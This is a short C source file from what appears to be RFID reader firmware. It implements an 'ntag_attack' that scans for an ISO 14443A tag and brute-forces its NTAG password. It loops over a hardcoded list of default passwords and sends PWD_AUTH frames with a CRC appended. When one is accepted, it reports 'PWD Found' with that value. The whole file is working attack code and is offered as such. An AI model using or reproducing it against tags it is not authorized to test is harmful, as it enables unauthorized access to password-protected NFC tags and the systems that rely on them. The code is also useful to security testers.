#include "ntag_attack.h"
#include "rc522.h"
#include "rfid_main.h"
#include <stdio.h>
#include <string.h>

static const uint8_t COMMON_PWDS[][4] = {
    {0xFF, 0xFF, 0xFF, 0xFF},
    {0x00, 0x00, 0x00, 0x00},
    {0x12, 0x34, 0x56, 0x78},
    {0x55, 0x55, 0x55, 0x55},
    {0xAA, 0x55, 0xAA, 0x55},
    {0x44, 0x4E, 0x47, 0x52} // DNGR
};

bool ntag_attack_run(char *out_buffer, uint16_t max_len) {
    picc_14a_tag_t tag;
    uint8_t status;
    uint8_t cmd[5];
    uint8_t resp[4];
    uint16_t resp_len;
    
    out_buffer[0] = '\0';
    
    status = pcd_14a_reader_scan_auto(&tag);
    if (status != STATUS_HF_TAG_OK) {
        snprintf(out_buffer, max_len, "No Card");
        return false;
    }
    
    // Command PWD_AUTH is 0x1B
    cmd[0] = 0x1B;
    
    for (int i = 0; i < sizeof(COMMON_PWDS)/sizeof(COMMON_PWDS[0]); i++) {
        memcpy(&cmd[1], COMMON_PWDS[i], 4);
        
        // PWD_AUTH
        // Standard NTAG: CRC must be appended
        
        // Use raw transceive to manage CRC
        // We need to append CRC to the 5 bytes (CMD + PWD)
        // pcd_14a_reader_bytes_transfer sends what we give it.
        // If we use pcd_14a_reader_raw_cmd, we can ask it to append CRC.
        // Let's use pcd_14a_reader_bytes_transfer and crc_utils.
        
        uint8_t tx_buf[7];
        memcpy(tx_buf, cmd, 5);
        crc_14a_append(tx_buf, 5);
        
        status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tx_buf, 7, resp, &resp_len, sizeof(resp) * 8);
        
        // Success if we get 2 bytes (PACK) + 2 bytes CRC
        if (status == STATUS_HF_TAG_OK && resp_len >= 16) { // 16 bits = 2 bytes payload
             snprintf(out_buffer, max_len, "PWD Found: %02X%02X%02X%02X", 
                      COMMON_PWDS[i][0], COMMON_PWDS[i][1], COMMON_PWDS[i][2], COMMON_PWDS[i][3]);
             return true;
        }
    }
    
    snprintf(out_buffer, max_len, "PWD Not Found");
    return false;
}
